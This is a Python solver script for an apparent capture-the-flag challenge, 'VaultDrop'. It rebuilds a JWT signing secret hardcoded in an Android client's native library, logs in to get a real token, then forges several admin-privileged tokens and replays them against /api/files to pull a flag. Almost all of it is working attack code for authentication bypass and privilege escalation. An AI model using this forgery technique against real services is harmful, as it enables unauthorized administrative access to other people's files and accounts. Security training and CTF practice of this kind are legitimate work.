#!/usr/bin/env python3
"""
VaultDrop CTF solver (challenge2_vaultdrop)

Target: --host HOST --port PORT

What it does:
- Derives the JWT signing secret leaked in the Android client (native lib).
  getAppJwtSecret() returns:
      sha256(seedA || seedB || b"vaultdrop.jwt.v2").hexdigest()

  Extracted seeds:
    seedA = 1ec2a7b1be9e59fa7a0ff354f12ac8d3   (16 bytes)
    seedB = a1e646a923cbe5f84e91ac5a0b23eccf   (16 bytes)
    tag   = "vaultdrop.jwt.v2"                  (16 bytes)

  => secret_hex = 4536ecd6d1c79c770306392bc7e20b0045437682694d3db5ab77220b8b5d76db

- Tries to register+login to obtain a real JWT (so we can mirror exact claims/alg).
- Forges several admin-like JWT variants and tests /api/files.
- Searches responses for UVT{...} and prints the flag.

Use ONLY for authorized CTF targets.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import random
import re
import string
import sys
import time
from dataclasses import dataclass
from typing import Any, Dict, Iterable, List, Optional, Tuple

try:
    import requests
except ImportError:
    print("[!] Missing dependency: requests")
    print("    Install with: py -m pip install requests")
    sys.exit(1)

FLAG_RE = re.compile(r"UVT\{[^}]+\}")

# ----------------------------
# JWT helpers (no PyJWT needed)
# ----------------------------

def b64url_encode(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")

def b64url_decode(seg: str | bytes) -> bytes:
    if isinstance(seg, str):
        seg = seg.encode("utf-8")
    pad = b"=" * ((4 - (len(seg) % 4)) % 4)
    return base64.urlsafe_b64decode(seg + pad)

def jwt_split(token: str) -> Tuple[str, str, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Not a JWT (expected 3 segments).")
    return parts[0], parts[1], parts[2]

def jwt_decode_noverify(token: str) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    h64, p64, _ = jwt_split(token)
    header = json.loads(b64url_decode(h64))
    payload = json.loads(b64url_decode(p64))
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("JWT header/payload not JSON objects.")
    return header, payload

def jwt_sign_hs(
    header: Dict[str, Any],
    payload: Dict[str, Any],
    key: bytes,
) -> str:
    alg = str(header.get("alg", "HS256")).upper()
    if alg not in ("HS256", "HS512"):
        raise ValueError(f"Unsupported alg for this solver: {alg}")

    header_json = json.dumps(header, separators=(",", ":"), sort_keys=True).encode("utf-8")
    payload_json = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")

    h64 = b64url_encode(header_json)
    p64 = b64url_encode(payload_json)
    signing_input = h64 + b"." + p64

    if alg == "HS256":
        digestmod = hashlib.sha256
    else:
        digestmod = hashlib.sha512

    sig = hmac.new(key, signing_input, digestmod).digest()
    s64 = b64url_encode(sig)
    return (signing_input + b"." + s64).decode("utf-8")

# ----------------------------
# Reverse-derived secret
# ----------------------------

def derive_jwt_secret_hex() -> str:
    # Reversed from libvault_crypto.so getAppJwtSecret():
    seed_a = bytes.fromhex("1ec2a7b1be9e59fa7a0ff354f12ac8d3")
    seed_b = bytes.fromhex("a1e646a923cbe5f84e91ac5a0b23eccf")
    tag = b"vaultdrop.jwt.v2"  # exactly 16 bytes
    return hashlib.sha256(seed_a + seed_b + tag).hexdigest()

# ----------------------------
# HTTP helpers
# ----------------------------

def try_json(resp: requests.Response) -> Optional[Any]:
    try:
        return resp.json()
    except Exception:
        return None

def find_jwt_in_obj(obj: Any) -> Optional[str]:
    """Heuristic: find any string value that looks like a JWT and decodes to JSON."""
    def walk(x: Any) -> Iterable[str]:
        if isinstance(x, dict):
            for v in x.values():
                yield from walk(v)
        elif isinstance(x, list):
            for v in x:
                yield from walk(v)
        elif isinstance(x, str):
            yield x

    for s in walk(obj):
        if s.count(".") == 2:
            try:
                jwt_decode_noverify(s)
                return s
            except Exception:
                pass
    return None

def extract_token_from_response(obj: Any) -> Optional[str]:
    # First: look for a JWT anywhere
    tok = find_jwt_in_obj(obj)
    if tok:
        return tok

    # Next: common keys
    if isinstance(obj, dict):
        for k in ("jwt_token", "jwt", "token", "access_token", "auth_token"):
            v = obj.get(k)
            if isinstance(v, str) and v:
                return v
    return None

def random_creds() -> Tuple[str, str, str]:
    suf = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    username = f"user{suf}"
    email = f"{username}@example.com"
    password = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    return username, email, password

def request_files(
    s: requests.Session,
    base: str,
    token: str,
    timeout: float,
    verify_tls: bool,
    verbose: bool,
) -> requests.Response:
    # Primary: Authorization: Bearer <jwt>
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
    }
    r = s.get(f"{base}/api/files", headers=headers, timeout=timeout, verify=verify_tls)

    if verbose:
        print(f"[i] GET /api/files (Authorization) -> {r.status_code}")

    # Fallback: query token
    if r.status_code in (401, 403):
        r2 = s.get(f"{base}/api/files", params={"token": token}, timeout=timeout, verify=verify_tls)
        if verbose:
            print(f"[i] GET /api/files (token=) -> {r2.status_code}")
        return r2

    # Fallback: X-Auth-Token
    if r.status_code in (401, 403):
        r3 = s.get(
            f"{base}/api/files",
            headers={"X-Auth-Token": token, "Accept": "application/json"},
            timeout=timeout,
            verify=verify_tls,
        )
        if verbose:
            print(f"[i] GET /api/files (X-Auth-Token) -> {r3.status_code}")
        return r3

    return r

def find_flag_in_text(text: str) -> Optional[str]:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None

# ----------------------------
# Forging strategy
# ----------------------------

def make_payload_variants(real_payload: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Create a set of likely-working escalations:
    - keep structure (so server-side expects same claim names)
    - flip id-like fields to 1
    - force email to admin domain
    - add common admin hints
    """
    now = int(time.time())

    def base(p: Dict[str, Any]) -> Dict[str, Any]:
        out = dict(p)
        # Keep iat if present; otherwise set.
        if "iat" not in out:
            out["iat"] = now
        # Push exp far enough.
        out["exp"] = now + 3600 * 24 * 30
        return out

    variants: List[Dict[str, Any]] = []

    # 0) As-is (in case the "real" token already works)
    variants.append(base(real_payload))

    # 1) Force email to internal domain (very common check)
    p = base(real_payload)
    p["email"] = "admin@vaultdrop.io"
    variants.append(p)

    # 2) Force id-like fields to 1 (owner_id 1 exists in APK seed SQL)
    p = base(real_payload)
    for k in list(p.keys()):
        kl = k.lower()
        if kl in ("id", "uid", "user_id", "userid") or kl.endswith("id"):
            if isinstance(p[k], int):
                p[k] = 1
            elif isinstance(p[k], str) and p[k].isdigit():
                p[k] = "1"
    # sub is often user id
    if "sub" in p and isinstance(p["sub"], (int, str)):
        p["sub"] = "1"
    else:
        p.setdefault("sub", "1")
    variants.append(p)

    # 3) Add explicit admin markers (in case server checks these)
    p = base(real_payload)
    p.setdefault("sub", "1")
    p.setdefault("username", "admin")
    p.setdefault("email", "admin@vaultdrop.io")
    p["admin"] = True
    p["is_admin"] = True
    p["role"] = "admin"
    p["scope"] = "*"
    variants.append(p)

    # 4) Minimal “admin” payload (if server only needs sub/email)
    variants.append({
        "sub": "1",
        "username": "admin",
        "email": "admin@vaultdrop.io",
        "iat": now,
        "exp": now + 3600 * 24 * 30,
    })

    # Deduplicate
    uniq: List[Dict[str, Any]] = []
    seen = set()
    for v in variants:
        key = json.dumps(v, sort_keys=True, separators=(",", ":"))
        if key not in seen:
            seen.add(key)
            uniq.append(v)
    return uniq

# ----------------------------
# Main
# ----------------------------

@dataclass
class LoginResult:
    token: Optional[str]
    header: Dict[str, Any]
    payload: Dict[str, Any]

def main() -> int:
    ap = argparse.ArgumentParser(description="VaultDrop CTF solver")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", required=True, type=int)
    ap.add_argument("--https", action="store_true", help="Use https:// instead of http://")
    ap.add_argument("--no-verify-tls", action="store_true", help="Disable TLS verification (for self-signed)")
    ap.add_argument("--timeout", type=float, default=12.0)
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--token", help="Skip login and start from this JWT token")
    ap.add_argument("--username", help="Username to register/login (default random)")
    ap.add_argument("--email", help="Email to register/login (default random)")
    ap.add_argument("--password", help="Password to register/login (default random)")
    args = ap.parse_args()

    scheme = "https" if args.https else "http"
    base = f"{scheme}://{args.host}:{args.port}"
    verify_tls = not args.no_verify_tls

    secret_hex = derive_jwt_secret_hex()
    print(f"[+] Derived JWT secret (hex string): {secret_hex}")

    # Try both interpretations for HMAC key:
    # 1) key is the hex string bytes
    # 2) key is raw bytes from that hex
    key_options: List[Tuple[str, bytes]] = [
        ("secret_hex_as_utf8", secret_hex.encode("utf-8")),
        ("secret_hex_as_rawbytes", bytes.fromhex(secret_hex)),
    ]

    s = requests.Session()

    # --------------------------------
    # Get a real token (optional but best)
    # --------------------------------
    login_res = LoginResult(token=None, header={}, payload={})

    if args.token:
        try:
            h, p = jwt_decode_noverify(args.token)
            login_res = LoginResult(token=args.token, header=h, payload=p)
            print("[+] Using provided token. Decoded payload:")
            print(json.dumps(p, indent=2))
        except Exception as e:
            print(f"[!] Provided --token is not a valid JWT: {e}")
            return 2
    else:
        username, email, password = (
            args.username,
            args.email,
            args.password,
        )
        if not (username and email and password):
            username, email, password = random_creds()

        if args.verbose:
            print(f"[i] Base URL: {base}")
            print(f"[i] Using creds: username={username} email={email} password={password}")

        # Register
        reg_body = {"username": username, "email": email, "password": password}
        try:
            r = s.post(f"{base}/api/register", json=reg_body, timeout=args.timeout, verify=verify_tls)
            if args.verbose:
                print(f"[i] POST /api/register -> {r.status_code}")
                print(r.text[:400])
        except Exception as e:
            print(f"[!] Register request failed (continuing anyway): {e}")

        # Login: try username/password then email/password
        token = None
        header: Dict[str, Any] = {}
        payload: Dict[str, Any] = {}

        login_attempts = [
            {"username": username, "password": password},
            {"email": email, "password": password},
        ]

        for body in login_attempts:
            try:
                r = s.post(f"{base}/api/login", json=body, timeout=args.timeout, verify=verify_tls)
                if args.verbose:
                    print(f"[i] POST /api/login {list(body.keys())} -> {r.status_code}")
                    print(r.text[:400])

                obj = try_json(r)
                if obj is None:
                    # maybe plain text?
                    obj = {"raw": r.text}

                token = extract_token_from_response(obj)
                if token:
                    header, payload = jwt_decode_noverify(token)
                    print("[+] Got real JWT from /api/login. Header/payload:")
                    print(json.dumps(header, indent=2))
                    print(json.dumps(payload, indent=2))
                    break
            except Exception as e:
                if args.verbose:
                    print(f"[i] login attempt failed: {e}")

        login_res = LoginResult(token=token, header=header, payload=payload)

        if not login_res.token:
            print("[!] Could not obtain a JWT via /api/login.")
            print("    Continuing with forged tokens from scratch (less reliable).")

    # --------------------------------
    # Try /api/files with the real token (if any)
    # --------------------------------
    if login_res.token:
        r = request_files(s, base, login_res.token, args.timeout, verify_tls, args.verbose)
        if r.status_code == 200:
            flag = find_flag_in_text(r.text)
            print("[+] /api/files with real token returned 200.")
            print(r.text)
            if flag:
                print(f"\n[🎉] FLAG: {flag}")
                return 0
        else:
            if args.verbose:
                print(f"[i] /api/files with real token -> {r.status_code}")
                print(r.text[:400])

    # --------------------------------
    # Forge tokens
    # --------------------------------
    real_header = login_res.header if login_res.header else {"alg": "HS256", "typ": "JWT"}
    # Keep alg from real token if present
    alg = str(real_header.get("alg", "HS256")).upper()
    if alg not in ("HS256", "HS512"):
        # fallback
        alg = "HS256"
    forge_header = dict(real_header)
    forge_header["alg"] = alg
    forge_header.setdefault("typ", "JWT")

    base_payload = login_res.payload if login_res.payload else {}
    variants = make_payload_variants(base_payload)

    print(f"[+] Trying {len(variants)} payload variants × {len(key_options)} key interpretations (alg={alg}) ...")

    for key_name, key_bytes in key_options:
        for idx, p in enumerate(variants, 1):
            try:
                tok = jwt_sign_hs(forge_header, p, key_bytes)
                if key_name == "secret_hex_as_utf8" and idx == 4:
                    print("\n[+] FORGED ADMIN TOKEN (variant 4):")
                    print(tok)
            except Exception as e:
                if args.verbose:
                    print(f"[i] signing failed ({key_name}, variant {idx}): {e}")
                continue

            if args.verbose:
                print(f"\n--- Attempt {key_name} / variant {idx} ---")
                print(json.dumps(p, indent=2))

            r = request_files(s, base, tok, args.timeout, verify_tls, args.verbose)

            if r.status_code == 200:
                print(f"[+] SUCCESS: /api/files returned 200 with forged token ({key_name}, variant {idx})")
                print(r.text)
                flag = find_flag_in_text(r.text)
                if flag:
                    print(f"\n[🎉] FLAG: {flag}")
                    return 0
            else:
                if args.verbose:
                    print(f"[i] forged token attempt -> {r.status_code}")
                    print(r.text[:300])

    print("\n[-] No flag found.")
    print("    If /api/files returns data but no UVT{...}, paste the JSON here and I’ll tell you next step.")
    return 1

if __name__ == "__main__":
    raise SystemExit(main())